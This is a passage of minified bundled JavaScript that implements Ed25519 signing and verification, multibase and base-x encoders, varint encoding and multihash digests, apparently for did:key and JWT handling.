        if (!(t instanceof e))
            throw new Error("invalid point at index " + o)
    }
    )
}
function nY(r, e) {
    if (!Array.isArray(r))
        throw new Error("array of scalars expected");
    r.forEach( (t, o) => {
        if (!e.isValid(t))
            throw new Error("invalid scalar at index " + o)
    }
    )
}
const i2 = new WeakMap
  , MM = new WeakMap;
function s2(r) {
    return MM.get(r) || 1
}
function oY(r, e) {
    return {
        constTimeNegate: n2,
        hasPrecomputes(t) {
            return s2(t) !== 1
        },
        unsafeLadder(t, o, i=r.ZERO) {
            let n = t;
            for (; o > J8; )
                o & ay && (i = i.add(n)),
                n = n.double(),
                o >>= ay;
            return i
        },
        precomputeWindow(t, o) {
            const {windows: i, windowSize: n} = o2(o, e)
              , s = [];
            let a = t
              , l = a;
            for (let f = 0; f < i; f++) {
                l = a,
                s.push(l);
                for (let h = 1; h < n; h++)
                    l = l.add(a),
                    s.push(l);
                a = l.double()
            }
            return s
        },
        wNAF(t, o, i) {
            const {windows: n, windowSize: s} = o2(t, e);
            let a = r.ZERO
              , l = r.BASE;
            const f = BigInt(2 ** t - 1)
              , h = 2 ** t
              , p = BigInt(t);
            for (let b = 0; b < n; b++) {
                const v = b * s;
                let T = Number(i & f);
                i >>= p,
                T > s && (T -= h,
                i += ay);
                const x = v
                  , E = v + Math.abs(T) - 1
                  , B = b % 2 !== 0
                  , P = T < 0;
                T === 0 ? l = l.add(n2(B, o[x])) : a = a.add(n2(P, o[E]))
            }
            return {
                p: a,
                f: l
            }
        },
        wNAFUnsafe(t, o, i, n=r.ZERO) {
            const {windows: s, windowSize: a} = o2(t, e)
              , l = BigInt(2 ** t - 1)
              , f = 2 ** t
              , h = BigInt(t);
            for (let p = 0; p < s; p++) {
                const b = p * a;
                if (i === J8)
                    break;
                let v = Number(i & l);
                if (i >>= h,
                v > a && (v -= f,
                i += ay),
                v === 0)
                    continue;
                let T = o[b + Math.abs(v) - 1];
                v < 0 && (T = T.negate()),
                n = n.add(T)
            }
            return n
        },
        getPrecomputes(t, o, i) {
            let n = i2.get(o);
            return n || (n = this.precomputeWindow(o, t),
            t !== 1 && i2.set(o, i(n))),
            n
        },
        wNAFCached(t, o, i) {
            const n = s2(t);
            return this.wNAF(n, this.getPrecomputes(n, t, i), o)
        },
        wNAFCachedUnsafe(t, o, i, n) {
            const s = s2(t);
            return s === 1 ? this.unsafeLadder(t, o, n) : this.wNAFUnsafe(s, this.getPrecomputes(s, t, i), o, n)
        },
        setWindowSize(t, o) {
            WM(o, e),
            MM.set(t, o),
            i2.delete(t)
        }
    }
}
function iY(r, e, t, o) {
    if (rY(t, r),
    nY(o, e),
    t.length !== o.length)
        throw new Error("arrays of points and scalars must have equal length");
    const i = r.ZERO
      , n = qZ(BigInt(t.length))
      , s = n > 12 ? n - 3 : n > 4 ? n - 2 : n ? 2 : 1
      , a = (1 << s) - 1
      , l = new Array(a + 1).fill(i)
      , f = Math.floor((e.BITS - 1) / s) * s;
    let h = i;
    for (let p = f; p >= 0; p -= s) {
        l.fill(i);
        for (let v = 0; v < o.length; v++) {
            const T = o[v]
              , x = Number(T >> BigInt(p) & BigInt(a));
            l[x] = l[x].add(t[v])
        }
        let b = i;
        for (let v = l.length - 1, T = i; v > 0; v--)
            T = T.add(l[v]),
            b = b.add(T);
        if (h = h.add(b),
        p !== 0)
            for (let v = 0; v < s; v++)
                h = h.double()
    }
    return h
}
function sY(r) {
    return QZ(r.Fp),
    E3(r, {
        n: "bigint",
        h: "bigint",
        Gx: "field",
        Gy: "field"
    }, {
        nBitLength: "isSafeInteger",
        nByteLength: "isSafeInteger"
    }),
    Object.freeze({
        ...OM(r.n, r.nBitLength),
        ...r,
        p: r.Fp.ORDER
    })
}
const Gi = BigInt(0)
  , Co = BigInt(1)
  , cy = BigInt(2)
  , aY = BigInt(8)
  , cY = {
    zip215: !0
};
function lY(r) {
    const e = sY(r);
    return E3(r, {
        hash: "function",
        a: "bigint",
        d: "bigint",
        randomBytes: "function"
    }, {
        adjustScalarBytes: "function",
        domain: "function",
        uvRatio: "function",
        mapToCurve: "function"
    }),
    Object.freeze({
        ...e
    })
}
function uY(r) {
    const e = lY(r)
      , {Fp: t, n: o, prehash: i, hash: n, randomBytes: s, nByteLength: a, h: l} = e
      , f = cy << BigInt(a * 8) - Co
      , h = t.create
      , p = RM(e.n, e.nBitLength)
      , b = e.uvRatio || ( (R, _) => {
        try {
            return {
                isValid: !0,
                value: t.sqrt(R * t.inv(_))
            }
        } catch {
            return {
                isValid: !1,
                value: Gi
            }
        }
    }
    )
      , v = e.adjustScalarBytes || (R => R)
      , T = e.domain || ( (R, _, $) => {
        if (t2("phflag", $),
        _.length || $)
            throw new Error("Contexts/pre-hash are not supported");
        return R
    }
    );
    function x(R, _) {
        up("coordinate " + R, _, Gi, f)
    }
    function E(R) {
        if (!(R instanceof O))
            throw new Error("ExtendedPoint expected")
    }
    const B = K8( (R, _) => {
        const {ex: $, ey: z, ez: K} = R
          , j = R.is0();
        _ == null && (_ = j ? aY : t.inv(K));
        const ee = h($ * _)
          , ie = h(z * _)
          , ae = h(K * _);
        if (j)
            return {
                x: Gi,
                y: Co
            };
        if (ae !== Co)
            throw new Error("invZ was invalid");
        return {
            x: ee,
            y: ie
        }
    }
    )
      , P = K8(R => {
        const {a: _, d: $} = e;
        if (R.is0())
            throw new Error("bad point: ZERO");
        const {ex: z, ey: K, ez: j, et: ee} = R
          , ie = h(z * z)
          , ae = h(K * K)
          , he = h(j * j)
          , me = h(he * he)
          , Pe = h(ie * _)
          , _e = h(he * h(Pe + ae))
          , Fe = h(me + h($ * h(ie * ae)));
        if (_e !== Fe)
            throw new Error("bad point: equation left != right (1)");
        const Je = h(z * K)
          , rt = h(j * ee);
        if (Je !== rt)
            throw new Error("bad point: equation left != right (2)");
        return !0
    }
    );
    class O {
        constructor(_, $, z, K) {
            this.ex = _,
            this.ey = $,
            this.ez = z,
            this.et = K,
            x("x", _),
            x("y", $),
            x("z", z),
            x("t", K),
            Object.freeze(this)
        }
        get x() {
            return this.toAffine().x
        }
        get y() {
            return this.toAffine().y
        }
        static fromAffine(_) {
            if (_ instanceof O)
                throw new Error("extended point not allowed");
            const {x: $, y: z} = _ || {};
            return x("x", $),
            x("y", z),
            new O($,z,Co,h($ * z))
        }
        static normalizeZ(_) {
            const $ = t.invertBatch(_.map(z => z.ez));
            return _.map( (z, K) => z.toAffine($[K])).map(O.fromAffine)
        }
        static msm(_, $) {
            return iY(O, p, _, $)
        }
        _setWindowSize(_) {
            I.setWindowSize(this, _)
        }
        assertValidity() {
            P(this)
        }
        equals(_) {
            E(_);
            const {ex: $, ey: z, ez: K} = this
              , {ex: j, ey: ee, ez: ie} = _
              , ae = h($ * ie)
              , he = h(j * K)
              , me = h(z * ie)
              , Pe = h(ee * K);
            return ae === he && me === Pe
        }
        is0() {
            return this.equals(O.ZERO)
        }
        negate() {
            return new O(h(-this.ex),this.ey,this.ez,h(-this.et))
        }
        double() {
            const {a: _} = e
              , {ex: $, ey: z, ez: K} = this
              , j = h($ * $)
              , ee = h(z * z)
              , ie = h(cy * h(K * K))
              , ae = h(_ * j)
              , he = $ + z
              , me = h(h(he * he) - j - ee)
              , Pe = ae + ee
              , _e = Pe - ie
              , Fe = ae - ee
              , Je = h(me * _e)
              , rt = h(Pe * Fe)
              , xt = h(me * Fe)
              , Tt = h(_e * Pe);
            return new O(Je,rt,Tt,xt)
        }
        add(_) {
            E(_);
            const {a: $, d: z} = e
              , {ex: K, ey: j, ez: ee, et: ie} = this
              , {ex: ae, ey: he, ez: me, et: Pe} = _;
            if ($ === BigInt(-1)) {
                const le = h((j - K) * (he + ae))
                  , Te = h((j + K) * (he - ae))
                  , Ue = h(Te - le);
                if (Ue === Gi)
                    return this.double();
                const Re = h(ee * cy * Pe)
                  , $e = h(ie * cy * me)
                  , st = $e + Re
                  , yt = Te + le
                  , vt = $e - Re
                  , Z = h(st * Ue)
                  , N = h(yt * vt)
                  , U = h(st * vt)
                  , ne = h(Ue * yt);
                return new O(Z,N,ne,U)
            }
            const _e = h(K * ae)
              , Fe = h(j * he)
              , Je = h(ie * z * Pe)
              , rt = h(ee * me)
              , xt = h((K + j) * (ae + he) - _e - Fe)
              , Tt = rt - Je
              , Qe = rt + Je
              , Ye = h(Fe - $ * _e)
              , Bt = h(xt * Tt)
              , Dr = h(Qe * Ye)
              , Cr = h(xt * Ye)
              , se = h(Tt * Qe);
            return new O(Bt,Dr,se,Cr)
        }
        subtract(_) {
            return this.add(_.negate())
        }
        wNAF(_) {
            return I.wNAFCached(this, _, O.normalizeZ)
        }
        multiply(_) {
            const $ = _;
            up("scalar", $, Co, o);
            const {p: z, f: K} = this.wNAF($);
            return O.normalizeZ([z, K])[0]
        }
        multiplyUnsafe(_, $=O.ZERO) {
            const z = _;
            return up("scalar", z, Gi, o),
            z === Gi ? D : this.is0() || z === Co ? this : I.wNAFCachedUnsafe(this, z, O.normalizeZ, $)
        }
        isSmallOrder() {
            return this.multiplyUnsafe(l).is0()
        }
        isTorsionFree() {
            return I.unsafeLadder(this, o).is0()
        }
        toAffine(_) {
            return B(this, _)
        }
        clearCofactor() {
            const {h: _} = e;
            return _ === Co ? this : this.multiplyUnsafe(_)
        }
        static fromHex(_, $=!1) {
            const {d: z, a: K} = e
              , j = t.BYTES;
            _ = ba("pointHex", _, j),
            t2("zip215", $);
            const ee = _.slice()
              , ie = _[j - 1];
            ee[j - 1] = ie & -129;
            const ae = wm(ee)
              , he = $ ? f : t.ORDER;
            up("pointHex.y", ae, Gi, he);
            const me = h(ae * ae)
              , Pe = h(me - Co)
              , _e = h(z * me - K);
            let {isValid: Fe, value: Je} = b(Pe, _e);
            if (!Fe)
                throw new Error("Point.fromHex: invalid y coordinate");
            const rt = (Je & Co) === Co
              , xt = (ie & 128) !== 0;
            if (!$ && Je === Gi && xt)
                throw new Error("Point.fromHex: x=0 and x_0=1");
            return xt !== rt && (Je = h(-Je)),
            O.fromAffine({
                x: Je,
                y: ae
            })
        }
        static fromPrivateKey(_) {
            return W(_).point
        }
        toRawBytes() {
            const {x: _, y: $} = this.toAffine()
              , z = OE($, t.BYTES);
            return z[z.length - 1] |= _ & Co ? 128 : 0,
            z
        }
        toHex() {
            return T3(this.toRawBytes())
        }
    }
    O.BASE = new O(e.Gx,e.Gy,Co,h(e.Gx * e.Gy)),
    O.ZERO = new O(Gi,Co,Co,Gi);
    const {BASE: F, ZERO: D} = O
      , I = oY(O, a * 8);
    function M(R) {
        return bn(R, o)
    }
    function C(R) {
        return M(wm(R))
    }
    function W(R) {
        const _ = t.BYTES;
        R = ba("private key", R, _);
        const $ = ba("hashed private key", n(R), 2 * _)
          , z = v($.slice(0, _))
          , K = $.slice(_, 2 * _)
          , j = C(z)
          , ee = F.multiply(j)
          , ie = ee.toRawBytes();
        return {
            head: z,
            prefix: K,
            scalar: j,
            point: ee,
            pointBytes: ie
        }
    }
    function k(R) {
        return W(R).pointBytes
    }
    function H(R=new Uint8Array, ..._) {
        const $ = G8(..._);
        return C(n(T($, ba("context", R), !!i)))
    }
    function X(R, _, $={}) {
        R = ba("message", R),
        i && (R = i(R));
        const {prefix: z, scalar: K, pointBytes: j} = W(_)
          , ee = H($.context, z, R)
          , ie = F.multiply(ee).toRawBytes()
          , ae = H($.context, ie, j, R)
          , he = M(ee + ae * K);
        up("signature.s", he, Gi, o);
        const me = G8(ie, OE(he, t.BYTES));
        return ba("result", me, t.BYTES * 2)
    }
    const Y = cY;
    function V(R, _, $, z=Y) {
        const {context: K, zip215: j} = z
          , ee = t.BYTES;
        R = ba("signature", R, 2 * ee),
        _ = ba("message", _),
        $ = ba("publicKey", $, ee),
        j !== void 0 && t2("zip215", j),
        i && (_ = i(_));
        const ie = wm(R.slice(ee, 2 * ee));
        let ae, he, me;
        try {
            ae = O.fromHex($, j),
            he = O.fromHex(R.slice(0, ee), j),
            me = F.multiplyUnsafe(ie)
        } catch {
            return !1
        }
        if (!j && ae.isSmallOrder())
            return !1;
        const Pe = H(K, he.toRawBytes(), ae.toRawBytes(), _);
        return he.add(ae.multiplyUnsafe(Pe)).subtract(me).clearCofactor().equals(O.ZERO)
    }
    return F._setWindowSize(8),
    {
        CURVE: e,
        getPublicKey: k,
        sign: X,
        verify: V,
        ExtendedPoint: O,
        utils: {
            getExtendedPublicKey: W,
            randomPrivateKey: () => s(t.BYTES),
            precompute(R=8, _=O.BASE) {
                return _._setWindowSize(R),
                _.multiply(BigInt(3)),
                _
            }
        }
    }
}
BigInt(0),
BigInt(1);
const A3 = BigInt("57896044618658097711785492504343953926634992332820282019728792003956564819949")
  , Q8 = BigInt("19681161376707505956807079304988542015446066515923890162744021073123829784752");
BigInt(0);
const fY = BigInt(1)
  , eB = BigInt(2);
BigInt(3);
const dY = BigInt(5)
  , hY = BigInt(8);
function pY(r) {
    const e = BigInt(10)
      , t = BigInt(20)
      , o = BigInt(40)
      , i = BigInt(80)
      , n = A3
      , s = r * r % n * r % n
      , a = Cs(s, eB, n) * s % n
      , l = Cs(a, fY, n) * r % n
      , f = Cs(l, dY, n) * l % n
      , h = Cs(f, e, n) * f % n
      , p = Cs(h, t, n) * h % n
      , b = Cs(p, o, n) * p % n
      , v = Cs(b, i, n) * b % n
      , T = Cs(v, i, n) * b % n
      , x = Cs(T, e, n) * f % n;
    return {
        pow_p_5_8: Cs(x, eB, n) * r % n,
        b2: s
    }
}
function gY(r) {
    return r[0] &= 248,
    r[31] &= 127,
    r[31] |= 64,
    r
}
function yY(r, e) {
    const t = A3
      , o = bn(e * e * e, t)
      , i = bn(o * o * e, t)
      , n = pY(r * i).pow_p_5_8;
    let s = bn(r * o * n, t);
    const a = bn(e * s * s, t)
      , l = s
      , f = bn(s * Q8, t)
      , h = a === r
      , p = a === bn(-r, t)
      , b = a === bn(-r * Q8, t);
    return h && (s = l),
    (p || b) && (s = f),
    XZ(s, t) && (s = bn(-s, t)),
    {
        isValid: h || p,
        value: s
    }
}
const bY = RM(A3, void 0, !0)
  , mY = {
    a: BigInt(-1),
    d: BigInt("37095705934669439343138083508754565189542113879843219016388785533085940283555"),
    Fp: bY,
    n: BigInt("7237005577332262213973186563042994240857116359379907606001950938285454250989"),
    h: hY,
    Gx: BigInt("15112221349535400772501151409588531511454012693041857206046113283949847762202"),
    Gy: BigInt("46316835694926478169428394003475163141307993866256225615783033603165251855960"),
    hash: kZ,
    randomBytes: PM,
    adjustScalarBytes: gY,
    uvRatio: yY
}
  , NM = uY(mY)
  , xY = "EdDSA"
  , wY = "JWT"
  , e1 = "."
  , B1 = "base64url"
  , DM = "utf8"
  , FM = "utf8"
  , vY = ":"
  , TY = "did"
  , EY = "key"
  , tB = "base58btc"
  , AY = "z"
  , PY = "K36"
  , CY = 32;
function P3(r) {
    return globalThis.Buffer != null ? new Uint8Array(r.buffer,r.byteOffset,r.byteLength) : r
}
function UM(r=0) {
    return globalThis.Buffer != null && globalThis.Buffer.allocUnsafe != null ? P3(globalThis.Buffer.allocUnsafe(r)) : new Uint8Array(r)
}
function kM(r, e) {
    e || (e = r.reduce( (i, n) => i + n.length, 0));
    const t = UM(e);
    let o = 0;
    for (const i of r)
        t.set(i, o),
        o += i.length;
    return P3(t)
}
function SY(r, e) {
    if (r.length >= 255)
        throw new TypeError("Alphabet too long");
    for (var t = new Uint8Array(256), o = 0; o < t.length; o++)
        t[o] = 255;
    for (var i = 0; i < r.length; i++) {
        var n = r.charAt(i)
          , s = n.charCodeAt(0);
        if (t[s] !== 255)
            throw new TypeError(n + " is ambiguous");
        t[s] = i
    }
    var a = r.length
      , l = r.charAt(0)
      , f = Math.log(a) / Math.log(256)
      , h = Math.log(256) / Math.log(a);
    function p(T) {
        if (T instanceof Uint8Array || (ArrayBuffer.isView(T) ? T = new Uint8Array(T.buffer,T.byteOffset,T.byteLength) : Array.isArray(T) && (T = Uint8Array.from(T))),
        !(T instanceof Uint8Array))
            throw new TypeError("Expected Uint8Array");
        if (T.length === 0)
            return "";
        for (var x = 0, E = 0, B = 0, P = T.length; B !== P && T[B] === 0; )
            B++,
            x++;
        for (var O = (P - B) * h + 1 >>> 0, F = new Uint8Array(O); B !== P; ) {
            for (var D = T[B], I = 0, M = O - 1; (D !== 0 || I < E) && M !== -1; M--,
            I++)
                D += 256 * F[M] >>> 0,
                F[M] = D % a >>> 0,
                D = D / a >>> 0;
            if (D !== 0)
                throw new Error("Non-zero carry");
            E = I,
            B++
        }
        for (var C = O - E; C !== O && F[C] === 0; )
            C++;
        for (var W = l.repeat(x); C < O; ++C)
            W += r.charAt(F[C]);
        return W
    }
    function b(T) {
        if (typeof T != "string")
            throw new TypeError("Expected String");
        if (T.length === 0)
            return new Uint8Array;
        var x = 0;
        if (T[x] !== " ") {
            for (var E = 0, B = 0; T[x] === l; )
                E++,
                x++;
            for (var P = (T.length - x) * f + 1 >>> 0, O = new Uint8Array(P); T[x]; ) {
                var F = t[T.charCodeAt(x)];
                if (F === 255)
                    return;
                for (var D = 0, I = P - 1; (F !== 0 || D < B) && I !== -1; I--,
                D++)
                    F += a * O[I] >>> 0,
                    O[I] = F % 256 >>> 0,
                    F = F / 256 >>> 0;
                if (F !== 0)
                    throw new Error("Non-zero carry");
                B = D,
                x++
            }
            if (T[x] !== " ") {
                for (var M = P - B; M !== P && O[M] === 0; )
                    M++;
                for (var C = new Uint8Array(E + (P - M)), W = E; M !== P; )
                    C[W++] = O[M++];
                return C
            }
        }
    }
    function v(T) {
        var x = b(T);
        if (x)
            return x;
        throw new Error(`Non-${e} character`)
    }
    return {
        encode: p,
        decodeUnsafe: b,
        decode: v
    }
}
var BY = SY
  , _Y = BY;
const LM = r => {
    if (r instanceof Uint8Array && r.constructor.name === "Uint8Array")
        return r;
    if (r instanceof ArrayBuffer)
        return new Uint8Array(r);
    if (ArrayBuffer.isView(r))
        return new Uint8Array(r.buffer,r.byteOffset,r.byteLength);
    throw new Error("Unknown type, must be binary type")
}
  , IY = r => new TextEncoder().encode(r)
  , OY = r => new TextDecoder().decode(r);
let RY = class {
    constructor(e, t, o) {
        this.name = e,
        this.prefix = t,
        this.baseEncode = o
    }
    encode(e) {
        if (e instanceof Uint8Array)
            return `${this.prefix}${this.baseEncode(e)}`;
        throw Error("Unknown type, must be binary type")
    }
}
  , WY = class {
    constructor(e, t, o) {
        if (this.name = e,
        this.prefix = t,
        t.codePointAt(0) === void 0)
            throw new Error("Invalid prefix character");
        this.prefixCodePoint = t.codePointAt(0),
        this.baseDecode = o
    }
    decode(e) {
        if (typeof e == "string") {
            if (e.codePointAt(0) !== this.prefixCodePoint)
                throw Error(`Unable to decode multibase string ${JSON.stringify(e)}, ${this.name} decoder only supports inputs prefixed with ${this.prefix}`);
            return this.baseDecode(e.slice(this.prefix.length))
        } else
            throw Error("Can only multibase decode strings")
    }
    or(e) {
        return $M(this, e)
    }
}
  , MY = class {
    constructor(e) {
        this.decoders = e
    }
    or(e) {
        return $M(this, e)
    }
    decode(e) {
        const t = e[0]
          , o = this.decoders[t];
        if (o)
            return o.decode(e);
        throw RangeError(`Unable to decode multibase string ${JSON.stringify(e)}, only inputs prefixed with ${Object.keys(this.decoders)} are supported`)
    }
}
;
const $M = (r, e) => new MY({
    ...r.decoders || {
        [r.prefix]: r
    },
    ...e.decoders || {
        [e.prefix]: e
    }
});
let NY = class {
    constructor(e, t, o, i) {
        this.name = e,
        this.prefix = t,
        this.baseEncode = o,
        this.baseDecode = i,
        this.encoder = new RY(e,t,o),
        this.decoder = new WY(e,t,i)
    }
    encode(e) {
        return this.encoder.encode(e)
    }
    decode(e) {
        return this.decoder.decode(e)
    }
}
;
const _1 = ({name: r, prefix: e, encode: t, decode: o}) => new NY(r,e,t,o)
  , b0 = ({prefix: r, name: e, alphabet: t}) => {
    const {encode: o, decode: i} = _Y(t, e);
    return _1({
        prefix: r,
        name: e,
        encode: o,
        decode: n => LM(i(n))
    })
}
  , DY = (r, e, t, o) => {
    const i = {};
    for (let h = 0; h < e.length; ++h)
        i[e[h]] = h;
    let n = r.length;
    for (; r[n - 1] === "="; )
        --n;
    const s = new Uint8Array(n * t / 8 | 0);
    let a = 0
      , l = 0
      , f = 0;
    for (let h = 0; h < n; ++h) {
        const p = i[r[h]];
        if (p === void 0)
            throw new SyntaxError(`Non-${o} character`);
        l = l << t | p,
        a += t,
        a >= 8 && (a -= 8,
        s[f++] = 255 & l >> a)
    }
    if (a >= t || 255 & l << 8 - a)
        throw new SyntaxError("Unexpected end of data");
    return s
}
  , FY = (r, e, t) => {
    const o = e[e.length - 1] === "="
      , i = (1 << t) - 1;
    let n = ""
      , s = 0
      , a = 0;
    for (let l = 0; l < r.length; ++l)
        for (a = a << 8 | r[l],
        s += 8; s > t; )
            s -= t,
            n += e[i & a >> s];
    if (s && (n += e[i & a << t - s]),
    o)
        for (; n.length * t & 7; )
            n += "=";
    return n
}
  , qn = ({name: r, prefix: e, bitsPerChar: t, alphabet: o}) => _1({
    prefix: e,
    name: r,
    encode(i) {
        return FY(i, o, t)
    },
    decode(i) {
        return DY(i, o, t, r)
    }
})
  , UY = _1({
    prefix: "\0",
    name: "identity",
    encode: r => OY(r),
    decode: r => IY(r)
});
var kY = Object.freeze({
    __proto__: null,
    identity: UY
});
const LY = qn({
    prefix: "0",
    name: "base2",
    alphabet: "01",
    bitsPerChar: 1
});
var $Y = Object.freeze({
    __proto__: null,
    base2: LY
});
const zY = qn({
    prefix: "7",
    name: "base8",
    alphabet: "01234567",
    bitsPerChar: 3
});
var jY = Object.freeze({
    __proto__: null,
    base8: zY
});
const qY = b0({
    prefix: "9",
    name: "base10",
    alphabet: "0123456789"
});
var VY = Object.freeze({
    __proto__: null,
    base10: qY
});
const HY = qn({
    prefix: "f",
    name: "base16",
    alphabet: "0123456789abcdef",
    bitsPerChar: 4
})
  , GY = qn({
    prefix: "F",
    name: "base16upper",
    alphabet: "0123456789ABCDEF",
    bitsPerChar: 4
});
var KY = Object.freeze({
    __proto__: null,
    base16: HY,
    base16upper: GY
});
const ZY = qn({
    prefix: "b",
    name: "base32",
    alphabet: "abcdefghijklmnopqrstuvwxyz234567",
    bitsPerChar: 5
})
  , YY = qn({
    prefix: "B",
    name: "base32upper",
    alphabet: "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567",
    bitsPerChar: 5
})
  , XY = qn({
    prefix: "c",
    name: "base32pad",
    alphabet: "abcdefghijklmnopqrstuvwxyz234567=",
    bitsPerChar: 5
})
  , JY = qn({
    prefix: "C",
    name: "base32padupper",
    alphabet: "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567=",
    bitsPerChar: 5
})
  , QY = qn({
    prefix: "v",
    name: "base32hex",
    alphabet: "0123456789abcdefghijklmnopqrstuv",
    bitsPerChar: 5
})
  , eX = qn({
    prefix: "V",
    name: "base32hexupper",
    alphabet: "0123456789ABCDEFGHIJKLMNOPQRSTUV",
    bitsPerChar: 5
})
  , tX = qn({
    prefix: "t",
    name: "base32hexpad",
    alphabet: "0123456789abcdefghijklmnopqrstuv=",
    bitsPerChar: 5
})
  , rX = qn({
    prefix: "T",
    name: "base32hexpadupper",
    alphabet: "0123456789ABCDEFGHIJKLMNOPQRSTUV=",
    bitsPerChar: 5
})
  , nX = qn({
    prefix: "h",
    name: "base32z",
    alphabet: "ybndrfg8ejkmcpqxot1uwisza345h769",
    bitsPerChar: 5
});
var oX = Object.freeze({
    __proto__: null,
    base32: ZY,
    base32upper: YY,
    base32pad: XY,
    base32padupper: JY,
    base32hex: QY,
    base32hexupper: eX,
    base32hexpad: tX,
    base32hexpadupper: rX,
    base32z: nX
});
const iX = b0({
    prefix: "k",
    name: "base36",
    alphabet: "0123456789abcdefghijklmnopqrstuvwxyz"
})
  , sX = b0({
    prefix: "K",
    name: "base36upper",
    alphabet: "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"
});
var aX = Object.freeze({
    __proto__: null,
    base36: iX,
    base36upper: sX
});
const cX = b0({
    name: "base58btc",
    prefix: "z",
    alphabet: "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"
})
  , lX = b0({
    name: "base58flickr",
    prefix: "Z",
    alphabet: "123456789abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ"
});
var uX = Object.freeze({
    __proto__: null,
    base58btc: cX,
    base58flickr: lX
});
const fX = qn({
    prefix: "m",
    name: "base64",
    alphabet: "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/",
    bitsPerChar: 6
})
  , dX = qn({
    prefix: "M",
    name: "base64pad",
    alphabet: "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",
    bitsPerChar: 6
})
  , hX = qn({
    prefix: "u",
    name: "base64url",
    alphabet: "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_",
    bitsPerChar: 6
})
  , pX = qn({
    prefix: "U",
    name: "base64urlpad",
    alphabet: "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_=",
    bitsPerChar: 6
});
var gX = Object.freeze({
    __proto__: null,
    base64: fX,
    base64pad: dX,
    base64url: hX,
    base64urlpad: pX
});
const zM = Array.from("")
  , yX = zM.reduce( (r, e, t) => (r[t] = e,
r), [])
  , bX = zM.reduce( (r, e, t) => (r[e.codePointAt(0)] = t,
r), []);
function mX(r) {
    return r.reduce( (e, t) => (e += yX[t],
    e), "")
}
function xX(r) {
    const e = [];
    for (const t of r) {
        const o = bX[t.codePointAt(0)];
        if (o === void 0)
            throw new Error(`Non-base256emoji character: ${t}`);
        e.push(o)
    }
    return new Uint8Array(e)
}
const wX = _1({
    prefix: "",
    name: "base256emoji",
    encode: mX,
    decode: xX
});
var vX = Object.freeze({
    __proto__: null,
    base256emoji: wX
})
  , TX = jM
  , rB = 128
  , EX = -128
  , AX = Math.pow(2, 31);
function jM(r, e, t) {
    e = e || [],
    t = t || 0;
    for (var o = t; r >= AX; )
        e[t++] = r & 255 | rB,
        r /= 128;
    for (; r & EX; )
        e[t++] = r & 255 | rB,
        r >>>= 7;
    return e[t] = r | 0,
    jM.bytes = t - o + 1,
    e
}
var PX = WE
  , CX = 128
  , nB = 127;
function WE(r, o) {
    var t = 0, o = o || 0, i = 0, n = o, s, a = r.length;
    do {
        if (n >= a)
            throw WE.bytes = 0,
            new RangeError("Could not decode varint");
        s = r[n++],
        t += i < 28 ? (s & nB) << i : (s & nB) * Math.pow(2, i),
        i += 7
    } while (s >= CX);
    return WE.bytes = n - o,
    t
}
var SX = Math.pow(2, 7)
  , BX = Math.pow(2, 14)
  , _X = Math.pow(2, 21)
  , IX = Math.pow(2, 28)
  , OX = Math.pow(2, 35)
  , RX = Math.pow(2, 42)
  , WX = Math.pow(2, 49)
  , MX = Math.pow(2, 56)
  , NX = Math.pow(2, 63)
  , DX = function(r) {
    return r < SX ? 1 : r < BX ? 2 : r < _X ? 3 : r < IX ? 4 : r < OX ? 5 : r < RX ? 6 : r < WX ? 7 : r < MX ? 8 : r < NX ? 9 : 10
}
  , FX = {
    encode: TX,
    decode: PX,
    encodingLength: DX
}
  , qM = FX;
const oB = (r, e, t=0) => (qM.encode(r, e, t),
e)
  , iB = r => qM.encodingLength(r)
  , ME = (r, e) => {
    const t = e.byteLength
      , o = iB(r)
      , i = o + iB(t)
      , n = new Uint8Array(i + t);
    return oB(r, n, 0),
    oB(t, n, o),
    n.set(e, i),
    new UX(r,t,e,n)
}
;
let UX = class {
    constructor(e, t, o, i) {
        this.code = e,
        this.size = t,
        this.digest = o,
        this.bytes = i
    }
}
;
const VM = ({name: r, code: e, encode: t}) => new kX(r,e,t);
let kX = class {
    constructor(e, t, o) {
        this.name = e,
        this.code = t,
        this.encode = o
    }
    digest(e) {
        if (e instanceof Uint8Array) {
            const t = this.encode(e);
            return t instanceof Uint8Array ? ME(this.code, t) : t.then(o => ME(this.code, o))
        } else
            throw Error("Unknown type, must be binary type")
    }
}
;
const HM = r => async e => new Uint8Array(await crypto.subtle.digest(r, e))
  , LX = VM({
    name: "sha2-256",
    code: 18,
    encode: HM("SHA-256")
})
  , $X = VM({
    name: "sha2-512",
    code: 19,
    encode: HM("SHA-512")
});
var zX = Object.freeze({
    __proto__: null,
    sha256: LX,
    sha512: $X
});
const GM = 0
  , jX = "identity"
  , KM = LM
  , qX = r => ME(GM, KM(r))
  , VX = {
    code: GM,
    name: jX,
    encode: KM,
    digest: qX
};
var HX = Object.freeze({
    __proto__: null,
    identity: VX
});
new TextEncoder,
new TextDecoder;
const sB = {
    ...kY,
    ...$Y,
    ...jY,
    ...VY,
    ...KY,
    ...oX,
    ...aX,
    ...uX,
    ...gX,
    ...vX
};
({
    ...zX,
    ...HX
});
function ZM(r, e, t, o) {
    return {
        name: r,
        prefix: e,
        encoder: {
            name: r,
            prefix: e,
            encode: t
        },
        decoder: {
            decode: o
        }
    }
}
const aB = ZM("utf8", "u", r => "u" + new TextDecoder("utf8").decode(r), r => new TextEncoder().encode(r.substring(1)))
  , a2 = ZM("ascii", "a", r => {
    let e = "a";
    for (let t = 0; t < r.length; t++)
        e += String.fromCharCode(r[t]);
    return e
}
, r => {
    r = r.substring(1);
    const e = UM(r.length);
    for (let t = 0; t < r.length; t++)
        e[t] = r.charCodeAt(t);
    return e
}
)
  , YM = {
    utf8: aB,
    "utf-8": aB,
    hex: sB.base16,
    latin1: a2,
    ascii: a2,
    binary: a2,
    ...sB
};
function I1(r, e="utf8") {
    const t = YM[e];
    if (!t)
        throw new Error(`Unsupported encoding "${e}"`);
